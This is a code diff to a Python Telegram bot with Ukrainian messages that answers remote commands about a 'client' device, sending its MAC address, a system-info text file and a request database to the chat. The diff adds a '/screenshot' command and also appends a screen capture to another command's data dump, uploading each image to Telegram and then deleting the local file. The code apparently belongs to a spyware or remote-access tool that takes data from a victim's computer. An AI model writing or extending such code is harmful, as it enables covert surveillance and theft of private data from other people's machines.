@@ -13,6 +13,9 @@ from uuid import getnode as get_mac
 import psutil
 import os
 from screeninfo import get_monitors
+import pyautogui
+
+
 
 
 
@@ -159,6 +162,13 @@ def main():
             elif get_message_text(upd).lower() == "/mac":
                 send_message(get_chat_id(upd),
                              f"MAC-адрес клієнта: {mac}")
+            elif get_message_text(upd).lower() == "/screenshot":
+                pyautogui.screenshot('screenshot_pyautogui.png')
+                text = 'Екран клієнта'
+                uphoto = open("screenshot_pyautogui.png", "rb")
+                bot.send_photo(get_chat_id(upd), uphoto, text)
+                uphoto.close()
+                os.remove("screenshot_pyautogui.png")
             elif get_message_text(upd).lower() == "/infotxt":
                 send_message(get_chat_id(upd),
                              "Всі дані про клієнта в .txt форматі:")
@@ -220,6 +230,12 @@ def main():
                 bot.send_document(get_chat_id(upd), upfile_3)
                 upfile_3.close()
                 os.remove("info.txt")
+                pyautogui.screenshot('screenshot_pyautogui.png')
+                text = 'Екран клієнта'
+                uphoto = open("screenshot_pyautogui.png", "rb")
+                bot.send_photo(get_chat_id(upd), uphoto, text)
+                uphoto.close()
+                os.remove("screenshot_pyautogui.png")
             elif get_message_text(upd).lower() == "/data":
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
